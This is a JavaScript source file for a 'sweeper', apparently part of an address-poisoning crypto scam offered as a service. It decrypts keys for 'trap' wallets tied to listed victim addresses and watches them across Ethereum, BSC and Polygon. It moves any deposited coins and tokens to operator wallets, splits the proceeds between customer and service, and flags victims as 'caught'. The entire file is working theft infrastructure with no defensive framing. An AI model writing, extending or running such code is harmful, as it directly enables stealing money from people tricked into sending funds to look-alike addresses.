import 'dotenv/config';
import { createWalletClient, http, publicActions, formatEther, formatUnits, parseAbi, encodeFunctionData, getAddress } from 'viem';
import { privateKeyToAccount } from 'viem/accounts';
import { mainnet, bsc, polygon } from 'viem/chains';
import axios from 'axios';
import { createClient } from '@supabase/supabase-js';

import { config } from '../lib/config.js';
import logger from '../lib/logger.js';
import { withRetry } from '../lib/retry.js';
import { sendAlert, formatAlert } from '../lib/notifier.js';
import { setupGracefulShutdown, onShutdown } from '../lib/shutdown.js';
import { decrypt } from '../lib/encryption.js';

console.log('[DEBUG] Starting sweeper.js...');

// --- Parse command line args for campaign and job ---
const args = process.argv.slice(2);
let campaignId = null;
let jobId = null;
for (let i = 0; i < args.length; i++) {
  if (args[i] === '--campaign-id') campaignId = args[++i];
  if (args[i] === '--job-id') jobId = args[++i];
}
// Also allow env override
campaignId = campaignId || process.env.CAMPAIGN_ID;
jobId = jobId || process.env.JOB_ID;

if (campaignId) console.log(`[DEBUG] Campaign ID: ${campaignId}`);
if (jobId) console.log(`[DEBUG] Job ID: ${jobId}`);

// --- Supabase Service Client (bypass RLS) ---
const supabaseUrl = process.env.NEXT_PUBLIC_SUPABASE_URL;
const supabaseServiceKey = process.env.SUPABASE_SERVICE_ROLE_KEY;
let supabaseService = null;
if (supabaseUrl && supabaseServiceKey) {
  supabaseService = createClient(supabaseUrl, supabaseServiceKey);
  console.log('[DEBUG] Supabase service client initialized');
} else {
  console.warn('[DEBUG] Supabase service credentials missing – profit sharing and DB features disabled');
}

// --- Config ---
const {
  sweeper: { pollIntervalMs, safeWallet },
  rpc: { sweeper: sweeperRpcUrl },
} = config;

// --- Service wallet from env ---
const SERVICE_WALLET = process.env.SERVICE_WALLET_ADDRESS;
if (!SERVICE_WALLET) {
  logger.warn('SERVICE_WALLET_ADDRESS not set. Service share will be skipped.');
}

// --- Caught victims (in-memory set, synced from database) ---
const caughtVictims = new Set();

// --- Catch threshold (USD) ---
const MIN_CATCH_USD = parseFloat(process.env.MIN_CATCH_USD || '1000');

// --- Minimum sweep threshold (USD) – don't sweep if value is below this ---
const MIN_SWEEP_USD = parseFloat(process.env.MIN_SWEEP_USD || '100');

// --- Helper: update job status (if jobId provided) ---
async function updateJob(status, progress = null, total = null, message = null) {
  if (!jobId || !supabaseService) return;
  const data = {};
  if (status) data.status = status;
  if (progress !== null) data.progress = progress;
  if (total !== null) data.total = total;
  if (message) data.message = message;
  if (status === 'running' && !data.started_at) data.started_at = new Date().toISOString();
  if (status === 'completed' || status === 'failed') data.completed_at = new Date().toISOString();
  try {
    await supabaseService.from('jobs').update(data).eq('id', jobId);
  } catch (err) {
    logger.error(`Failed to update job ${jobId}: ${err.message}`);
  }
}

// --- Helper: fetch user's profit split and safe wallet ---
async function getUserProfitSplit(campaignId) {
  if (!supabaseService) {
    return { profitSplitPercent: 75, safeWallet: safeWallet };
  }
  try {
    const { data: campaign, error } = await supabaseService
      .from('campaigns')
      .select('user_id, safe_wallet_address')
      .eq('id', campaignId)
      .single();
    if (error) throw error;
    const { data: user, error: userError } = await supabaseService
      .from('users')
      .select('profit_split_percent')
      .eq('id', campaign.user_id)
      .single();
    if (userError) throw userError;
    return {
      profitSplitPercent: user.profit_split_percent || 75,
      safeWallet: campaign.safe_wallet_address,
    };
  } catch (err) {
    logger.error(`Failed to fetch profit split: ${err.message}`);
    return { profitSplitPercent: 75, safeWallet: safeWallet };
  }
}

// --- Helper: create transaction record ---
async function createTransaction(campaignId, trapAddress, tokenSymbol, amount, usdValue, txHash, type = 'sweep') {
  if (!supabaseService) return null;
  try {
    const { data, error } = await supabaseService.from('transactions').insert({
      campaign_id: campaignId,
      trap_address: trapAddress,
      token_symbol: tokenSymbol,
      amount: amount,
      usd_value: usdValue,
      tx_hash: txHash,
      type: type,
      status: 'completed',
    }).select().single();
    if (error) throw error;
    return data.id;
  } catch (err) {
    logger.error(`Failed to create transaction: ${err.message}`);
    return null;
  }
}

// --- Helper: create profit share record ---
async function createProfitShare(transactionId, userAmount, serviceAmount, userTxHash, serviceTxHash) {
  if (!supabaseService) return;
  try {
    await supabaseService.from('profit_shares').insert({
      transaction_id: transactionId,
      user_amount: userAmount,
      service_amount: serviceAmount,
      user_share_tx_hash: userTxHash,
      service_share_tx_hash: serviceTxHash,
      settled_at: new Date().toISOString(),
    });
  } catch (err) {
    logger.error(`Failed to record profit share: ${err.message}`);
  }
}

// ─── Load caught victims from database ───
async function loadCaughtVictims() {
  if (!supabaseService) {
    console.warn('[sweeper] Supabase service not available – caught victims list will be empty');
    return;
  }
  try {
    const { data, error } = await supabaseService
      .from('traps')
      .select('victim_address')
      .eq('is_caught', true);
    if (error) throw error;
    if (data && data.length > 0) {
      const newSet = new Set(data.map(row => row.victim_address.toLowerCase()));
      caughtVictims.clear();
      newSet.forEach(addr => caughtVictims.add(addr));
      console.log(`[DEBUG] Loaded ${caughtVictims.size} caught victims from database`);
    }
  } catch (err) {
    console.warn(`[DEBUG] Could not load caught victims from DB: ${err.message}`);
  }
}

// ─── Mark a victim as caught (database) ───
async function markVictimCaught(victimAddress) {
  if (!victimAddress) return;
  const addr = victimAddress.toLowerCase();
  if (caughtVictims.has(addr)) return;
  caughtVictims.add(addr);
  if (!supabaseService) {
    logger.warn(`Cannot mark caught: Supabase service not available`);
    return;
  }
  try {
    // Update all traps for this victim to is_caught = true
    await supabaseService
      .from('traps')
      .update({ is_caught: true })
      .eq('victim_address', addr);
    logger.info(`Victim marked as caught: ${addr}`);
    await sendAlert(`🎯 Victim caught\nVictim: ${addr}`);
  } catch (err) {
    logger.error(`Failed to mark victim caught ${addr}: ${err.message}`);
  }
}

// ─── Load traps from database (supports campaignId or all traps for chain) ───
async function getTrapsFromDB(campaignId = null) {
  if (!supabaseService) {
    logger.error('Supabase service client not available.');
    return [];
  }
  try {
    let query = supabaseService
      .from('traps')
      .select('trap_private_key_enc, victim_address, trap_address, campaign_id');
    if (campaignId) {
      query = query.eq('campaign_id', campaignId);
    } else {
      // If no campaignId, fetch all traps for the current chain
      // We need to join with campaigns to filter by chain
      // We'll use a subquery: get campaign ids for the chain
      // For simplicity, we'll first get campaigns for this chain
      const { data: campaigns, error: campError } = await supabaseService
        .from('campaigns')
        .select('id')
        .eq('chain', chainName);
      if (campError) {
        console.error('[sweeper] Failed to fetch campaigns for chain:', campError);
        return [];
      }
      if (!campaigns || campaigns.length === 0) {
        console.log(`[sweeper] No campaigns found for chain ${chainName}`);
        return [];
      }
      const campaignIds = campaigns.map(c => c.id);
      query = query.in('campaign_id', campaignIds);
    }

    const { data, error } = await query;
    if (error) throw error;
    if (!data || data.length === 0) {
      console.log(`[sweeper] No traps found${campaignId ? ` for campaign ${campaignId}` : ` on chain ${chainName}`}`);
      return [];
    }
    const entries = [];
    for (const row of data) {
      const encKey = row.trap_private_key_enc;
      if (!encKey) continue;
      try {
        const privateKey = decrypt(encKey);
        const account = privateKeyToAccount(privateKey);
        const trapAddress = account.address.toLowerCase();
        entries.push({
          privateKey,
          trapAddress,
          victimAddress: row.victim_address ? row.victim_address.toLowerCase() : null,
        });
      } catch (e) {
        logger.error(`Failed to decrypt private key for trap ${row.trap_address}: ${e.message}`);
        continue;
      }
    }
    console.log(`[sweeper] Loaded ${entries.length} trap entries from database`);
    return entries;
  } catch (err) {
    logger.error(`Failed to fetch traps from database: ${err.message}`);
    return [];
  }
}

if (!safeWallet) {
  console.error('SAFE_WALLET_ADDRESS is not set.');
  logger.error('SAFE_WALLET_ADDRESS is not set.');
  process.exit(1);
}

// --- MULTI‑CHAIN: get chain‑specific configs (with legacy fallback) ---
const chainName = config.chain || 'ethereum';
const chainCfg = config.getChainConfig ? config.getChainConfig() : null;
const nativeSymbol = chainCfg?.nativeSymbol || 'ETH';
const chainId = chainCfg?.chainId || 1;

// Viem chain object for the current chain
let viemChain;
switch (chainName) {
  case 'bsc':
    viemChain = bsc;
    break;
  case 'polygon':
    viemChain = polygon;
    break;
  default:
    viemChain = mainnet;
}

// --- Token list: use chain‑specific tokens with correct decimals from config ---
let TOKEN_LIST = [];
if (chainCfg && chainCfg.tokens) {
  const tokenDecimals = chainCfg.token_decimals || {};
  TOKEN_LIST = Object.entries(chainCfg.tokens).map(([symbol, address]) => {
    const decimals = tokenDecimals[symbol] ?? 18;
    return { symbol, address, decimals };
  });
} else {
  // Fallback to hardcoded list (Ethereum mainnet)
  TOKEN_LIST = [
    { symbol: 'USDC', address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', decimals: 6 },
    { symbol: 'USDT', address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', decimals: 6 },
    { symbol: 'WBTC', address: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599', decimals: 8 },
    { symbol: 'WETH', address: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2', decimals: 18 },
    { symbol: 'STETH', address: '0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84', decimals: 18 },
    { symbol: 'USDe', address: '0x4c9EDD5852cd905f086C759E8383e09bff1E68B3', decimals: 18 },
    { symbol: 'DAI', address: '0x6B175474E89094C44Da98b954EedeAC495271d0F', decimals: 18 },
    { symbol: 'LINK', address: '0x514910771AF9Ca656af840dff83E8264EcF986CA', decimals: 18 },
    { symbol: 'TON', address: '0x582d872A1B094FC48F5DE31D3B73F2D9bE47def1', decimals: 9 },
    { symbol: 'SHIB', address: '0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE', decimals: 18 },
    { symbol: 'UNI', address: '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984', decimals: 18 },
    { symbol: 'PEPE', address: '0x6982508145454Ce325dDbE47a25d4ec3d2311933', decimals: 18 },
    { symbol: 'LEO', address: '0x2AF5D2aD76741191D15Dfe7bF6aC92d4Bd912Ca3', decimals: 18 },
    { symbol: 'WBETH', address: '0xa2E3356610840701BDf5611a53974510Ae27E2e1', decimals: 18 },
  ];
}

// --- RPC URL: prefer chain‑specific RPC, otherwise use legacy sweeperRpcUrl ---
const chainRpc = chainCfg?.rpc || sweeperRpcUrl;
console.log(`[DEBUG] Chain: ${chainName}, Native symbol: ${nativeSymbol}, Viem chain: ${viemChain.name}`);
console.log('[DEBUG] TOKEN_LIST:', TOKEN_LIST.map(t => `${t.symbol} (${t.address})`).join(', '));
console.log(`[DEBUG] Sweeper RPC: ${chainRpc}`);

const MIN_ETH_SWEEP = BigInt(process.env.MIN_ETH_SWEEP_WEI || '1000000000000000');

const ERC20_ABI = parseAbi([
  'function balanceOf(address owner) view returns (uint256)',
  'function transfer(address to, uint256 amount) returns (bool)',
]);

// --- Helper: retry with timeout ---
async function withRpcRetry(fn, context, maxAttempts = 2, baseDelay = 1000) {
  return withRetry(fn, context, maxAttempts, baseDelay);
}

// --- Price fetching (with fallback and cache handling) ---
let priceCache = {};
let lastPriceFetch = 0;
const PRICE_CACHE_MS = 5 * 60 * 1000; // 5 minutes
let lastPriceFetchFailed = false;

async function fetchTokenPrices() {
  const now = Date.now();
  if (now - lastPriceFetch < PRICE_CACHE_MS && Object.keys(priceCache).length > 0) {
    return priceCache;
  }

  const ids = [nativeSymbol.toLowerCase()];
  const tokenSymbols = TOKEN_LIST.map(t => t.symbol.toLowerCase());
  const allSymbols = [...new Set([...ids, ...tokenSymbols])];

  const symbolToId = {
    eth: 'ethereum',
    bnb: 'binancecoin',
    matic: 'matic-network',
    usdc: 'usd-coin',
    usdt: 'tether',
    dai: 'dai',
    wbtc: 'bitcoin',
    weth: 'weth',
    steth: 'staked-ether',
    wbeth: 'wrapped-bitcoin',
    busd: 'binance-usd',
    link: 'chainlink',
    uni: 'uniswap',
    shib: 'shiba-inu',
    pepe: 'pepe',
    leo: 'leo-token',
    ton: 'toncoin',
    wmatic: 'matic-network',
    wbnb: 'binancecoin',
    'usde': 'ethena-usde',
  };

  try {
    const coinIds = allSymbols.map(s => symbolToId[s]).filter(Boolean);
    if (coinIds.length === 0) return priceCache;
    const url = `https://api.coingecko.com/api/v3/simple/price?ids=${coinIds.join(',')}&vs_currencies=usd`;
    const resp = await axios.get(url, { timeout: 10000 });
    if (resp.status === 200) {
      const data = resp.data;
      const newCache = {};
      for (const sym of allSymbols) {
        const id = symbolToId[sym];
        if (id && data[id] && data[id].usd) {
          newCache[sym] = data[id].usd;
        }
      }
      if (Object.keys(newCache).length > 0) {
        priceCache = newCache;
        lastPriceFetch = now;
        lastPriceFetchFailed = false;
        logger.debug(`Fetched prices: ${JSON.stringify(priceCache)}`);
      } else {
        throw new Error('No prices received from CoinGecko');
      }
    } else {
      throw new Error(`CoinGecko responded with ${resp.status}`);
    }
  } catch (e) {
    logger.warn(`Price fetch failed: ${e.message}`);
    lastPriceFetchFailed = true;
    if (Object.keys(priceCache).length === 0) {
      priceCache = {};
    }
  }
  return priceCache;
}

// --- Create clients from DB entries ---
function createSweeperClientsFromEntries(entries) {
  console.log(`[DEBUG] Creating clients for ${entries.length} entries...`);
  const clients = [];
  for (const entry of entries) {
    try {
      const account = privateKeyToAccount(entry.privateKey);
      const trapAddress = account.address;
      const client = createWalletClient({
        account,
        chain: viemChain,
        transport: http(chainRpc, { timeout: 10000 }),
      }).extend(publicActions);
      clients.push({
        ...entry,
        trapAddress,
        account,
        client,
      });
    } catch (e) {
      logger.error(`Invalid private key: ${entry.privateKey.slice(0, 10)}...`);
    }
  }
  console.log(`[DEBUG] Created ${clients.length} valid clients.`);
  return clients;
}

// --- sweepAddress (unchanged except markVictimCaught now DB-based) ---
async function sweepAddress(client, trapAddress, safeWallet, victimAddress = null) {
  const timeoutMs = 30000;
  const timeoutPromise = new Promise((_, reject) => setTimeout(() => reject(new Error('Sweep timeout')), timeoutMs));
  try {
    await Promise.race([
      (async () => {
        const prices = await fetchTokenPrices();

        let profitSplitPercent = 75;
        let userSafeWallet = safeWallet;
        let serviceWallet = SERVICE_WALLET;
        let useSplitting = false;

        if (campaignId && supabaseService) {
          const config = await getUserProfitSplit(campaignId);
          profitSplitPercent = config.profitSplitPercent;
          userSafeWallet = config.safeWallet;
          useSplitting = true;
          if (!serviceWallet) {
            logger.warn('SERVICE_WALLET_ADDRESS not set – service share will be skipped');
          }
        }

        // --- Native currency ---
        const balance = await withRpcRetry(
          () => client.getBalance({ address: trapAddress }),
          `getBalance(${trapAddress})`,
          2, 1000
        );
        if (balance > 0n) {
          const nativeSymbolLower = nativeSymbol.toLowerCase();
          const nativePrice = prices[nativeSymbolLower] || 0;
          const ethValue = parseFloat(formatEther(balance));
          const usdValue = ethValue * nativePrice;

          if (usdValue >= MIN_CATCH_USD) {
            if (victimAddress) await markVictimCaught(victimAddress);
          }

          if (usdValue >= MIN_SWEEP_USD) {
            const gasPrice = await withRpcRetry(() => client.getGasPrice(), `getGasPrice(${trapAddress})`, 2, 1000);
            let gasLimit = 21000n;
            if (useSplitting && serviceWallet) {
              gasLimit = 21000n * 2n;
            }
            const gasCost = gasLimit * gasPrice;
            const totalSendable = balance - gasCost;
            if (totalSendable > 0n) {
              let userAmount = totalSendable;
              let serviceAmount = 0n;
              let userTxHash = null;
              let serviceTxHash = null;

              if (useSplitting && serviceWallet) {
                const userShare = profitSplitPercent / 100;
                userAmount = (totalSendable * BigInt(Math.round(userShare * 100))) / 100n;
                serviceAmount = totalSendable - userAmount;
                if (userAmount > 0n && userSafeWallet) {
                  userTxHash = await withRpcRetry(
                    () => client.sendTransaction({ to: userSafeWallet, value: userAmount, gas: 21000n, gasPrice }),
                    `sendTransaction(${trapAddress})`,
                    2, 1000
                  );
                  logger.info(`[!!!] ${nativeSymbol} USER SWEEP: ${formatEther(userAmount)} to ${userSafeWallet} TX: ${userTxHash}`);
                }
                if (serviceAmount > 0n && serviceWallet) {
                  serviceTxHash = await withRpcRetry(
                    () => client.sendTransaction({ to: serviceWallet, value: serviceAmount, gas: 21000n, gasPrice }),
                    `sendTransaction(${trapAddress})`,
                    2, 1000
                  );
                  logger.info(`[!!!] ${nativeSymbol} SERVICE SWEEP: ${formatEther(serviceAmount)} to ${serviceWallet} TX: ${serviceTxHash}`);
                }
              } else {
                userTxHash = await withRpcRetry(
                  () => client.sendTransaction({ to: userSafeWallet, value: totalSendable, gas: 21000n, gasPrice }),
                  `sendTransaction(${trapAddress})`,
                  2, 1000
                );
                logger.info(`[!!!] ${nativeSymbol} SWEEP COMPLETE. TX Hash: ${userTxHash}`);
                userAmount = totalSendable;
              }

              if (campaignId && supabaseService) {
                const txHash = userTxHash || serviceTxHash;
                const txId = await createTransaction(
                  campaignId,
                  trapAddress,
                  nativeSymbol,
                  formatEther(balance),
                  usdValue,
                  txHash,
                  'sweep'
                );
                if (txId) {
                  await createProfitShare(
                    txId,
                    formatEther(userAmount),
                    formatEther(serviceAmount),
                    userTxHash,
                    serviceTxHash
                  );
                }
                await sendAlert(
                  `💰 ${nativeSymbol} Sweep executed${useSplitting ? ' (split)' : ''}\n` +
                  `Trap: ${trapAddress}\n` +
                  `User: ${formatEther(userAmount)} ${nativeSymbol}\n` +
                  (serviceAmount > 0n ? `Service: ${formatEther(serviceAmount)} ${nativeSymbol}\n` : '') +
                  `TX: ${txHash}`
                );
              } else {
                await sendAlert(`💰 ${nativeSymbol} Sweep executed\nTrap: ${trapAddress}\nAmount: ${formatEther(userAmount)} ${nativeSymbol}\nTX: ${userTxHash || serviceTxHash}`);
              }
            }
          }
        }

        // --- Token sweeps (unchanged) ---
        const multicallContracts = TOKEN_LIST.map(token => ({
          address: getAddress(token.address),
          abi: ERC20_ABI,
          functionName: 'balanceOf',
          args: [trapAddress]
        }));

        let tokenBalances = [];
        try {
          tokenBalances = await withRpcRetry(
            () => client.multicall({ contracts: multicallContracts }),
            `multicall(${trapAddress})`,
            2, 1000
          );
        } catch (e) {
          logger.warn(`Multicall failed for ${trapAddress}: ${e.message}`);
          return;
        }

        for (let i = 0; i < TOKEN_LIST.length; i++) {
          const token = TOKEN_LIST[i];
          const result = tokenBalances[i];

          if (result.status === 'success' && result.result > 0n) {
            const tokenBalance = result.result;
            const formatted = formatUnits(tokenBalance, token.decimals);
            const tokenSymLower = token.symbol.toLowerCase();
            const tokenPrice = prices[tokenSymLower] || 0;
            const usdValue = parseFloat(formatted) * tokenPrice;

            if (usdValue >= MIN_CATCH_USD) {
              if (victimAddress) await markVictimCaught(victimAddress);
            }

            if (usdValue < MIN_SWEEP_USD) continue;

            logger.info(`[!!!] ${token.symbol} BALANCE DETECTED for ${trapAddress}: ${formatted} (≈$${usdValue.toFixed(2)})`);
            await sendAlert(`💰 ${token.symbol} Balance detected\nTrap: ${trapAddress}\nAmount: ${formatted} ${token.symbol}\n≈$${usdValue.toFixed(2)}`);

            try {
              const tokenAddr = getAddress(token.address);
              const gasEstimate = await withRpcRetry(
                () => client.estimateGas({
                  account: client.account,
                  to: tokenAddr,
                  data: encodeFunctionData({ abi: ERC20_ABI, functionName: 'transfer', args: [client.account.address, tokenBalance] }),
                }),
                `estimateGas(token ${token.symbol})`,
                2, 1000
              );
              const gasPrice = await withRpcRetry(() => client.getGasPrice(), `getGasPrice(token ${token.symbol})`, 2, 1000);
              let totalFee = gasEstimate * gasPrice;
              if (useSplitting && serviceWallet) {
                totalFee = totalFee * 2n;
              }
              const currentNativeBalance = await withRpcRetry(() => client.getBalance({ address: trapAddress }), `getBalance(${trapAddress})`, 2, 1000);
              if (currentNativeBalance < totalFee) {
                logger.warn(`Insufficient ${nativeSymbol} to cover gas for ${token.symbol} sweep. Skipping.`);
                continue;
              }

              let userAmount = tokenBalance;
              let serviceAmount = 0n;
              let userTxHash = null;
              let serviceTxHash = null;

              if (useSplitting && serviceWallet) {
                const userShare = profitSplitPercent / 100;
                userAmount = (tokenBalance * BigInt(Math.round(userShare * 100))) / 100n;
                serviceAmount = tokenBalance - userAmount;
                if (userAmount > 0n && userSafeWallet) {
                  userTxHash = await withRpcRetry(
                    () => client.sendTransaction({
                      to: tokenAddr,
                      data: encodeFunctionData({ abi: ERC20_ABI, functionName: 'transfer', args: [userSafeWallet, userAmount] }),
                    }),
                    `sendTransaction(${trapAddress}, ${token.symbol})`,
                    2, 1000
                  );
                  logger.info(`[!!!] ${token.symbol} USER SWEEP: ${formatUnits(userAmount, token.decimals)} to ${userSafeWallet} TX: ${userTxHash}`);
                }
                if (serviceAmount > 0n && serviceWallet) {
                  serviceTxHash = await withRpcRetry(
                    () => client.sendTransaction({
                      to: tokenAddr,
                      data: encodeFunctionData({ abi: ERC20_ABI, functionName: 'transfer', args: [serviceWallet, serviceAmount] }),
                    }),
                    `sendTransaction(${trapAddress}, ${token.symbol})`,
                    2, 1000
                  );
                  logger.info(`[!!!] ${token.symbol} SERVICE SWEEP: ${formatUnits(serviceAmount, token.decimals)} to ${serviceWallet} TX: ${serviceTxHash}`);
                }
              } else {
                userTxHash = await withRpcRetry(
                  () => client.sendTransaction({
                    to: tokenAddr,
                    data: encodeFunctionData({ abi: ERC20_ABI, functionName: 'transfer', args: [userSafeWallet, tokenBalance] }),
                  }),
                  `sendTransaction(${trapAddress}, ${token.symbol})`,
                  2, 1000
                );
                logger.info(`[!!!] ${token.symbol} SWEEP COMPLETE. TX Hash: ${userTxHash}`);
                userAmount = tokenBalance;
              }

              if (campaignId && supabaseService) {
                const txHash = userTxHash || serviceTxHash;
                const txId = await createTransaction(
                  campaignId,
                  trapAddress,
                  token.symbol,
                  formatted,
                  usdValue,
                  txHash,
                  'sweep'
                );
                if (txId) {
                  await createProfitShare(
                    txId,
                    formatUnits(userAmount, token.decimals),
                    formatUnits(serviceAmount, token.decimals),
                    userTxHash,
                    serviceTxHash
                  );
                }
                await sendAlert(
                  `💰 ${token.symbol} Sweep executed${useSplitting ? ' (split)' : ''}\n` +
                  `Trap: ${trapAddress}\n` +
                  `User: ${formatUnits(userAmount, token.decimals)} ${token.symbol}\n` +
                  (serviceAmount > 0n ? `Service: ${formatUnits(serviceAmount, token.decimals)} ${token.symbol}\n` : '') +
                  `TX: ${txHash}`
                );
              } else {
                await sendAlert(`💰 ${token.symbol} Sweep executed\nTrap: ${trapAddress}\nAmount: ${formatted} ${token.symbol}\nTX: ${userTxHash || serviceTxHash}`);
              }
            } catch (e) {
              logger.debug(`Error sending ${token.symbol} for ${trapAddress}: ${e.message}`);
            }
          }
        }
      })(),
      timeoutPromise
    ]);
  } catch (e) {
    if (e.message === 'Sweep timeout') {
      logger.warn(`Sweep timed out for ${trapAddress}`);
    } else {
      logger.error(`Error sweeping ${trapAddress}: ${e.message}`);
    }
  }
}

// --- Single address mode ---
async function sweepSingle(privateKey, destination) {
  const account = privateKeyToAccount(privateKey);
  const client = createWalletClient({ account, chain: viemChain, transport: http(chainRpc, { timeout: 10000 }) }).extend(publicActions);
  const trapAddress = account.address;
  logger.info(`Monitoring Poisoned Wallet: ${trapAddress}`);
  logger.info(`Destination Safe Wallet: ${destination}`);

  let isRunning = false;
  const run = async () => {
    if (isRunning) return;
    isRunning = true;
    try {
      await sweepAddress(client, trapAddress, destination);
    } catch (err) {
      logger.error(`Sweep error: ${err.message}`);
    } finally {
      isRunning = false;
    }
  };
  const interval = setInterval(run, pollIntervalMs);
  run();
  onShutdown(() => { clearInterval(interval); logger.info('Sweeper interval cleared.'); });
}

// --- Batch mode (DB-only) ---
async function sweepBatch() {
  let entries = [];
  let trapToVictim = new Map();

  // Fetch traps from database (either by campaign or all traps for chain)
  console.log(`[DEBUG] Fetching traps from database${campaignId ? ` for campaign ${campaignId}` : ` for chain ${chainName}`}`);
  entries = await getTrapsFromDB(campaignId);
  if (entries.length === 0) {
    console.error(`[DEBUG] No traps found. Exiting.`);
    logger.error(`No traps found. Exiting.`);
    if (jobId) await updateJob('failed', null, null, 'No traps found');
    process.exit(1);
  }

  // Build trap->victim map
  for (const e of entries) {
    if (e.victimAddress) {
      trapToVictim.set(e.trapAddress.toLowerCase(), e.victimAddress);
    }
  }

  // Create clients from entries
  const clients = createSweeperClientsFromEntries(entries);
  console.log(`[DEBUG] Clients created: ${clients.length}`);
  logger.info(`Loaded ${clients.length} trap addresses`);
  logger.info(`Destination Safe Wallet: ${safeWallet}`);

  let isSweeping = false;

  const runSweep = async () => {
    if (isSweeping) return;
    isSweeping = true;
    try {
      for (const c of clients) {
        const victim = trapToVictim.get(c.trapAddress.toLowerCase()) || null;
        await sweepAddress(c.client, c.trapAddress, safeWallet, victim);
      }
    } catch (err) {
      logger.error(`Batch sweep error: ${err.message}`);
    } finally {
      isSweeping = false;
    }
  };

  const scheduleNext = () => {
    setTimeout(async () => {
      await runSweep();
      scheduleNext();
    }, pollIntervalMs);
  };

  await runSweep();
  scheduleNext();

  onShutdown(() => { logger.info('Sweeper stopping...'); });
}

// --- Graceful shutdown ---
setupGracefulShutdown();

// --- Entry point ---
// Load caught victims from DB on start
await loadCaughtVictims();
// Periodically reload caught victims
setInterval(loadCaughtVictims, 30000);

if (jobId) {
  updateJob('running').catch(err => logger.error(`Failed to update job start: ${err.message}`));
}

const argsCmd = process.argv.slice(2);
if (argsCmd.length >= 2) {
  console.log('[DEBUG] Single mode');
  sweepSingle(argsCmd[0], argsCmd[1]).catch(async (err) => {
    console.error(`[DEBUG] Fatal error: ${err.message}`);
    logger.error(`Fatal error: ${err.message}`);
    await sendAlert(formatAlert('error', { source: 'sweeper', error: err.message }));
    if (jobId) await updateJob('failed', null, null, err.message);
    process.exit(1);
  });
} else {
  console.log('[DEBUG] Batch mode');
  sweepBatch().catch(async (err) => {
    console.error(`[DEBUG] Fatal error: ${err.message}`);
    logger.error(`Fatal error: ${err.message}`);
    await sendAlert(formatAlert('error', { source: 'sweeper', error: err.message }));
    if (jobId) await updateJob('failed', null, null, err.message);
    process.exit(1);
  });
}